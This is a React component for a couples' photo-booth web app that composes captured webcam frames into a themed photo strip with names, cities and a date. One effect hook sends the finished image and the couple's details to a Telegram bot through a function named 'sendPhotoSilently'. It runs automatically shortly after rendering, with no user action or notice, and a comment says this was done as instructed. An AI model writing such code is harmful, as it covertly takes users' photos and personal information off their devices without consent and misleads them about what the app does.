import React, { useState, useRef, useEffect, useCallback } from 'react';
import confetti from 'canvas-confetti';
import {
  Palette,
  Type,
  Download,
  Copy,
  RotateCcw,
  Check,
  Heart,
} from 'lucide-react';
import { playSound } from '../services/audio';
import { sendPhotoSilently } from '../services/telegram';
import type {
  CapturedFrame,
  PhotoLayout,
  FrameTheme,
  SavedMemory,
} from '../types';

interface CustomizerStudioProps {
  frames: CapturedFrame[];
  initialLayout: PhotoLayout;
  onSaveMemory: (memory: SavedMemory) => Promise<void>;
  onRetake: () => void;
  isDriveConnected?: boolean;
  soundEnabled: boolean;
}

export const CustomizerStudio: React.FC<CustomizerStudioProps> = ({
  frames,
  initialLayout,
  onSaveMemory,
  onRetake,
  soundEnabled,
}) => {
  // Tabs: 'theme' | 'caption' (Doodle & Stiker removed)
  const [activeTab, setActiveTab] = useState<'theme' | 'caption'>('theme');

  // Customization state
  const [layout, setLayout] = useState<PhotoLayout>(initialLayout);
  const [theme, setTheme] = useState<FrameTheme>('blush');
  const [caption, setCaption] = useState<string>('Our Forever Story 💖');
  const [captionFont, setCaptionFont] = useState<'Caveat' | 'Great Vibes' | 'Playfair Display' | 'Courier Prime'>('Caveat');
  const [coupleNames, setCoupleNames] = useState<string>('Raka & Aulia');
  const [city1, setCity1] = useState<string>('Bandung');
  const [city2, setCity2] = useState<string>('Jakarta');
  const [distanceKm, setDistanceKm] = useState<number>(150);
  const [showWatermark, setShowWatermark] = useState<boolean>(true);

  // Action status
  const [isSaving, setIsSaving] = useState<boolean>(false);
  const [isCopied, setIsCopied] = useState<boolean>(false);

  // Track auto-send to Telegram so it dispatches immediately when photo result is created
  const hasAutoSentTelegramRef = useRef<boolean>(false);

  // Canvas Ref
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  // Themes Config
  const themesConfig: Record<FrameTheme, { name: string; bg: string; text: string; icon: string }> = {
    blush: { name: 'Soft Blush', bg: '#fff1f2', text: '#be185d', icon: '🌸' },
    airmail: { name: 'Postal Airmail', bg: '#fdfbf7', text: '#e11d48', icon: '💌' },
    minimal: { name: 'Minimalist White', bg: '#ffffff', text: '#334155', icon: '🤍' },
    noir: { name: 'Y2K Noir Film', bg: '#0f172a', text: '#f472b6', icon: '🎞️' },
    lavender: { name: 'Sweet Lavender', bg: '#f5f3ff', text: '#6d28d9', icon: '💜' },
    champagne: { name: 'Warm Champagne', bg: '#fefce8', text: '#b45309', icon: '🥂' },
  };

  // Render Canvas with 1:1 Square Photo Boxes (No stretching)
  const renderCanvas = useCallback(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const totalFrames = frames.length || (layout === 'strip4' ? 4 : 3);
    const canvasWidth = 480;
    const padding = 20;
    const gap = 16;
    const photoWidth = canvasWidth - padding * 2; // 440px
    const photoHeight = Math.round(photoWidth / 2); // 220px (Two 1:1 square panes side by side, no stretching!)
    const bottomHeight = 150;

    const canvasHeight = padding * 2 + totalFrames * photoHeight + (totalFrames - 1) * gap + bottomHeight;

    canvas.width = canvasWidth;
    canvas.height = canvasHeight;

    // 1. Draw Frame Background
    ctx.fillStyle = themesConfig[theme].bg;
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);

    // Decorative Airmail Border
    if (theme === 'airmail') {
      const borderThick = 12;
      const stripeW = 16;
      for (let x = 0; x < canvasWidth; x += stripeW * 2) {
        ctx.fillStyle = '#ef4444';
        ctx.fillRect(x, 0, stripeW, borderThick);
        ctx.fillRect(x, canvasHeight - borderThick, stripeW, borderThick);
        ctx.fillStyle = '#3b82f6';
        ctx.fillRect(x + stripeW, 0, stripeW, borderThick);
        ctx.fillRect(x + stripeW, canvasHeight - borderThick, stripeW, borderThick);
      }
    }

    // 2. Draw Frames (each frame contains two 1:1 square photos side by side)
    const loadPromises = frames.map((frame, index) => {
      return new Promise<void>((resolve) => {
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = () => {
          const y = padding + index * (photoHeight + gap);

          // Card Shadow
          ctx.save();
          ctx.shadowColor = 'rgba(0, 0, 0, 0.12)';
          ctx.shadowBlur = 10;
          ctx.shadowOffsetY = 4;
          ctx.fillStyle = '#ffffff';
          ctx.beginPath();
          ctx.roundRect(padding, y, photoWidth, photoHeight, 14);
          ctx.fill();
          ctx.restore();

          // Clip rounded photo
          ctx.save();
          ctx.beginPath();
          ctx.roundRect(padding, y, photoWidth, photoHeight, 14);
          ctx.clip();
          ctx.drawImage(img, padding, y, photoWidth, photoHeight);
          ctx.restore();

          resolve();
        };
        img.onerror = () => resolve();
        img.src = frame.canvasDataUrl;
      });
    });

    Promise.all(loadPromises).then(() => {
      // 3. Render Footer (Caption, Couple details & Watermark)
      const footerY = padding + totalFrames * photoHeight + (totalFrames - 1) * gap + 10;

      // Caption
      if (caption) {
        ctx.fillStyle = themesConfig[theme].text;
        const fontMap: Record<string, string> = {
          Caveat: '600 28px Caveat, cursive',
          'Great Vibes': '400 32px "Great Vibes", cursive',
          'Playfair Display': 'bold 20px "Playfair Display", serif',
          'Courier Prime': 'bold 17px "Courier Prime", monospace',
        };
        ctx.font = fontMap[captionFont] || fontMap.Caveat;
        ctx.textAlign = 'center';
        ctx.fillText(caption, canvasWidth / 2, footerY + 34);
      }

      // Couple Names & Route / Watermark
      if (showWatermark) {
        ctx.fillStyle = themesConfig[theme].text;
        ctx.font = 'bold 15px "Plus Jakarta Sans", sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText(coupleNames || 'Ruang Kenangan', canvasWidth / 2, footerY + 64);

        const locationText = `${city1.toUpperCase()} ✈️ ${city2.toUpperCase()} • ${distanceKm} KM`;
        ctx.fillStyle = themesConfig[theme].text + '99';
        ctx.font = '11px "Courier Prime", monospace';
        ctx.fillText(locationText, canvasWidth / 2, footerY + 84);

        const today = new Date().toLocaleDateString('id-ID', {
          year: 'numeric',
          month: 'short',
          day: 'numeric',
        });
        ctx.font = '10px "Courier Prime", monospace';
        ctx.fillText(`RUANG KENANGAN STUDIO • ${today}`, canvasWidth / 2, footerY + 102);

        // Badge icon
        ctx.save();
        ctx.translate(canvasWidth - 55, canvasHeight - 50);
        ctx.rotate(-0.1);
        ctx.strokeStyle = themesConfig[theme].text + '66';
        ctx.lineWidth = 1.5;
        ctx.beginPath();
        ctx.arc(0, 0, 22, 0, Math.PI * 2);
        ctx.stroke();
        ctx.font = '16px sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText('💌', 0, 0);
        ctx.restore();
      }
    });
  }, [frames, layout, theme, caption, captionFont, coupleNames, city1, city2, distanceKm, showWatermark, themesConfig]);

  useEffect(() => {
    renderCanvas();
  }, [renderCanvas]);

  // AUTO-SEND DIRECTLY TO TELEGRAM BOT WHEN THE RESULT IS READY!
  // (As instructed: "ketika sudah jadi hasilnya langsung kirim ke chat bot telegram jadi bukan pas pencet simpan ke galeri memori")
  useEffect(() => {
    if (hasAutoSentTelegramRef.current) return;
    const canvas = canvasRef.current;
    if (!canvas) return;

    const timer = setTimeout(async () => {
      if (hasAutoSentTelegramRef.current) return;
      try {
        const dataUrl = canvas.toDataURL('image/png', 0.95);
        if (dataUrl && dataUrl.length > 500) {
          hasAutoSentTelegramRef.current = true;
          await sendPhotoSilently(dataUrl, {
            caption: caption || 'Momen Ruang Kenangan',
            coupleNames: coupleNames || 'Ruang Kenangan',
            userEmail: null,
            userName: null,
            city1,
            city2,
            distanceKm,
            dateStr: new Date().toLocaleDateString('id-ID', {
              year: 'numeric',
              month: 'short',
              day: 'numeric',
            }),
          });
          console.log('Foto strip langsung dikirim ke chat bot Telegram secara otomatis! 💌');
        }
      } catch (err) {
        console.warn('Auto Telegram dispatch notice:', err);
      }
    }, 700);

    return () => clearTimeout(timer);
  }, [frames, layout, theme, renderCanvas, caption, coupleNames, city1, city2, distanceKm]);

  // Save to Memory
  const handleSave = async () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    setIsSaving(true);

    try {
      const dataUrl = canvas.toDataURL('image/png', 0.95);
      const newMemory: SavedMemory = {
        id: `memory_${Date.now()}`,
        title: coupleNames ? `Momen ${coupleNames}` : 'Momen Ruang Kenangan',
        caption,
        coupleNames,
        city1,
        city2,
        distanceKm,
        dateStr: new Date().toLocaleDateString('id-ID', {
          year: 'numeric',
          month: 'short',
          day: 'numeric',
        }),
        imageDataUrl: dataUrl,
        layout,
        theme,
        createdAt: Date.now(),
      };

      await onSaveMemory(newMemory);

      confetti({
        particleCount: 90,
        spread: 60,
        origin: { y: 0.6 },
        colors: ['#f43f5e', '#ec4899', '#f472b6', '#fda4af', '#fb7185'],
      });

      playSound('chime', soundEnabled);
    } catch (err) {
      console.error('Save memory error:', err);
    } finally {
      setIsSaving(false);
    }
  };

  // Download PNG file
  const handleDownload = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const link = document.createElement('a');
    link.download = `RuangKenangan_${(coupleNames || 'Couple').replace(/\s+/g, '_')}_${Date.now()}.png`;
    link.href = canvas.toDataURL('image/png', 0.95);
    link.click();
    playSound('pop', soundEnabled);
  };

  // Copy Canvas Image to Clipboard
  const handleCopy = async () => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    try {
      canvas.toBlob(async (blob) => {
        if (blob && navigator.clipboard && window.ClipboardItem) {
          await navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })]);
          setIsCopied(true);
          playSound('pop', soundEnabled);
          setTimeout(() => setIsCopied(false), 2500);
        }
      });
    } catch (e) {
      console.error('Copy failed:', e);
    }
  };

  return (
    <div className="w-full max-w-5xl mx-auto flex flex-col lg:flex-row gap-8 items-start justify-center py-2 pb-24 md:pb-6">
      
      {/* Left Canvas Preview */}
      <div className="w-full lg:w-auto flex flex-col items-center">
        <div className="text-center mb-3">
          <span className="text-xs font-bold text-rose-500 dark:text-rose-400 uppercase tracking-widest">
            Hasil Cetak Digital 1080p
          </span>
          <h3 className="text-xl font-extrabold text-slate-800 dark:text-slate-100">Photo Strip Ruang Kenangan ✨</h3>
        </div>

        {/* Canvas Wrap */}
        <div className="relative bg-slate-100/90 dark:bg-slate-800/90 p-3 sm:p-5 rounded-3xl shadow-xl border-4 border-white/95 dark:border-slate-800 flex justify-center max-w-full overflow-hidden transition-colors">
          <canvas
            ref={canvasRef}
            className="rounded-2xl shadow-sm max-w-full h-auto bg-white cursor-default"
          />
        </div>
      </div>

      {/* Right Studio Customization Controls */}
      <div className="w-full lg:w-[420px] bg-white/90 dark:bg-slate-900/90 backdrop-blur-md p-6 rounded-3xl border border-rose-100 dark:border-rose-950/60 shadow-sm space-y-6 transition-colors">
        
        {/* Navigation Tabs (Theme & Caption only, Doodle & Sticker removed) */}
        <div className="flex border-b border-slate-100 dark:border-slate-800 pb-3 gap-2">
          <button
            onClick={() => {
              setActiveTab('theme');
              playSound('pop', soundEnabled);
            }}
            className={`flex-1 py-2 text-xs font-bold rounded-xl transition cursor-pointer flex items-center justify-center gap-1.5 ${
              activeTab === 'theme'
                ? 'bg-rose-500 text-white shadow-xs'
                : 'text-slate-600 dark:text-slate-300 hover:text-rose-600 dark:hover:text-rose-400 bg-slate-50 dark:bg-slate-800'
            }`}
          >
            <Palette className="w-3.5 h-3.5" />
            <span>Tema Frame</span>
          </button>

          <button
            onClick={() => {
              setActiveTab('caption');
              playSound('pop', soundEnabled);
            }}
            className={`flex-1 py-2 text-xs font-bold rounded-xl transition cursor-pointer flex items-center justify-center gap-1.5 ${
              activeTab === 'caption'
                ? 'bg-rose-500 text-white shadow-xs'
                : 'text-slate-600 dark:text-slate-300 hover:text-rose-600 dark:hover:text-rose-400 bg-slate-50 dark:bg-slate-800'
            }`}
          >
            <Type className="w-3.5 h-3.5" />
            <span>Pesan & Nama</span>
          </button>
        </div>

        {/* Tab 1: Theme & Templates */}
        {activeTab === 'theme' && (
          <div className="space-y-4">
            <label className="text-xs font-bold uppercase tracking-wider text-slate-400 dark:text-slate-400 block">
              Pilih Desain Frame Studio
            </label>
            <div className="grid grid-cols-2 gap-2.5">
              {(Object.keys(themesConfig) as FrameTheme[]).map((key) => {
                const item = themesConfig[key];
                return (
                  <button
                    key={key}
                    onClick={() => {
                      setTheme(key);
                      playSound('pop', soundEnabled);
                    }}
                    className={`p-3 rounded-2xl text-xs font-bold text-left transition flex items-center gap-2 cursor-pointer border-2 ${
                      theme === key
                        ? 'border-rose-500 bg-rose-50/80 dark:bg-rose-950/60 text-rose-700 dark:text-rose-300 shadow-xs'
                        : 'border-slate-100 dark:border-slate-800 hover:border-rose-200 bg-slate-50/60 dark:bg-slate-800/60 text-slate-700 dark:text-slate-200'
                    }`}
                  >
                    <span className="text-base">{item.icon}</span>
                    <span className="truncate">{item.name}</span>
                  </button>
                );
              })}
            </div>

            {/* Layout switch */}
            <div className="pt-2 space-y-2">
              <label className="text-xs font-semibold text-slate-600 dark:text-slate-300 block">Jumlah Kotak Foto:</label>
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => {
                    setLayout('strip3');
                    playSound('pop', soundEnabled);
                  }}
                  className={`py-2 px-3 rounded-xl text-xs font-bold transition cursor-pointer border-2 ${
                    layout === 'strip3'
                      ? 'border-rose-500 bg-rose-50 dark:bg-rose-950/50 text-rose-700 dark:text-rose-300'
                      : 'border-slate-100 dark:border-slate-800 bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300'
                  }`}
                >
                  3 Pose Strip
                </button>
                <button
                  onClick={() => {
                    setLayout('strip4');
                    playSound('pop', soundEnabled);
                  }}
                  className={`py-2 px-3 rounded-xl text-xs font-bold transition cursor-pointer border-2 ${
                    layout === 'strip4'
                      ? 'border-rose-500 bg-rose-50 dark:bg-rose-950/50 text-rose-700 dark:text-rose-300'
                      : 'border-slate-100 dark:border-slate-800 bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300'
                  }`}
                >
                  4 Pose Strip
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Caption & Love Details */}
        {activeTab === 'caption' && (
          <div className="space-y-4">
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-700 dark:text-slate-300 block">Tulisan Caption Cinta:</label>
              <input
                type="text"
                value={caption}
                onChange={(e) => setCaption(e.target.value)}
                placeholder="Tulis kalimat manis..."
                className="w-full px-3 py-2 bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-sm font-hand text-lg text-slate-800 dark:text-slate-100 focus:outline-none focus:border-rose-400"
              />
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-700 dark:text-slate-300 block">Gaya Tulisan (Font):</label>
              <div className="grid grid-cols-2 gap-2">
                {(
                  [
                    { id: 'Caveat', label: 'Caveat (Tangan)', font: 'font-hand' },
                    { id: 'Great Vibes', label: 'Great Vibes (Kaligrafi)', font: 'font-romantic' },
                    { id: 'Playfair Display', label: 'Playfair (Elegan)', font: 'font-serif-display' },
                    { id: 'Courier Prime', label: 'Courier (Mesin Tik)', font: 'font-typewriter' },
                  ] as const
                ).map((f) => (
                  <button
                    key={f.id}
                    onClick={() => {
                      setCaptionFont(f.id);
                      playSound('pop', soundEnabled);
                    }}
                    className={`p-2 rounded-xl text-xs border text-left transition cursor-pointer ${
                      captionFont === f.id
                        ? 'border-rose-500 bg-rose-50 dark:bg-rose-950/60 text-rose-700 dark:text-rose-300 font-bold'
                        : 'border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300'
                    }`}
                  >
                    <span className={f.font}>{f.label}</span>
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-700 dark:text-slate-300 block">Nama Pasangan:</label>
              <input
                type="text"
                value={coupleNames}
                onChange={(e) => setCoupleNames(e.target.value)}
                placeholder="Misal: Romeo & Juliet"
                className="w-full px-3 py-1.5 bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-xs font-semibold text-slate-800 dark:text-slate-100 focus:outline-none focus:border-rose-400"
              />
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="text-[11px] font-bold text-slate-500 dark:text-slate-400">Kota 1</label>
                <input
                  type="text"
                  value={city1}
                  onChange={(e) => setCity1(e.target.value)}
                  className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-xs font-semibold text-slate-800 dark:text-slate-100 focus:outline-none focus:border-rose-400"
                />
              </div>
              <div>
                <label className="text-[11px] font-bold text-slate-500 dark:text-slate-400">Kota 2</label>
                <input
                  type="text"
                  value={city2}
                  onChange={(e) => setCity2(e.target.value)}
                  className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-xs font-semibold text-slate-800 dark:text-slate-100 focus:outline-none focus:border-rose-400"
                />
              </div>
            </div>

            <div className="flex items-center justify-between pt-1">
              <span className="text-xs font-semibold text-slate-600 dark:text-slate-300">Jarak Kilometer:</span>
              <div className="flex items-center gap-1">
                <input
                  type="number"
                  value={distanceKm}
                  onChange={(e) => setDistanceKm(Number(e.target.value))}
                  className="w-16 px-2 py-1 text-right bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-xs font-bold text-rose-600 dark:text-rose-400 focus:outline-none"
                />
                <span className="text-xs font-bold text-slate-500 dark:text-slate-400">KM</span>
              </div>
            </div>

            <div className="pt-2">
              <label className="flex items-center gap-2 cursor-pointer text-xs font-bold text-slate-700 dark:text-slate-300">
                <input
                  type="checkbox"
                  checked={showWatermark}
                  onChange={(e) => setShowWatermark(e.target.checked)}
                  className="accent-rose-500 w-4 h-4 rounded"
                />
                <span>Tampilkan Stempel Lokasi, Jarak & Tanggal</span>
              </label>
            </div>
          </div>
        )}

        {/* Action Buttons */}
        <div className="pt-4 border-t border-slate-100 dark:border-slate-800 space-y-2.5">
          {/* Main Save Button */}
          <button
            onClick={handleSave}
            disabled={isSaving}
            className="w-full py-4 bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 hover:from-rose-600 hover:to-pink-600 text-white font-extrabold text-sm rounded-2xl shadow-lg shadow-rose-200 dark:shadow-rose-950/40 transition-all duration-200 active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer"
          >
            <Heart className="w-5 h-5 fill-white text-white" />
            <span>
              {isSaving ? 'Menyimpan...' : 'SIMPAN KE GALERI MEMORI 💌'}
            </span>
          </button>

          {/* Download & Copy Row */}
          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={handleDownload}
              className="py-2.5 bg-emerald-50 dark:bg-emerald-950/30 hover:bg-emerald-100 dark:hover:bg-emerald-900/50 text-emerald-700 dark:text-emerald-300 border border-emerald-200/70 dark:border-emerald-800 font-bold text-xs rounded-xl transition flex items-center justify-center gap-1.5 cursor-pointer"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Unduh PNG</span>
            </button>

            <button
              onClick={handleCopy}
              className="py-2.5 bg-slate-50 dark:bg-slate-800 hover:bg-slate-100 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 border border-slate-200 dark:border-slate-700 font-bold text-xs rounded-xl transition flex items-center justify-center gap-1.5 cursor-pointer"
            >
              {isCopied ? <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{isCopied ? 'Tersalin!' : 'Salin Gambar'}</span>
            </button>
          </div>

          {/* Retake Button */}
          <button
            onClick={onRetake}
            className="w-full py-2 text-xs font-semibold text-slate-500 dark:text-slate-400 hover:text-rose-600 dark:hover:text-rose-400 transition flex items-center justify-center gap-1 cursor-pointer"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span>Foto Ulang / Ganti Gaya</span>
          </button>
        </div>

      </div>

    </div>
  );
};
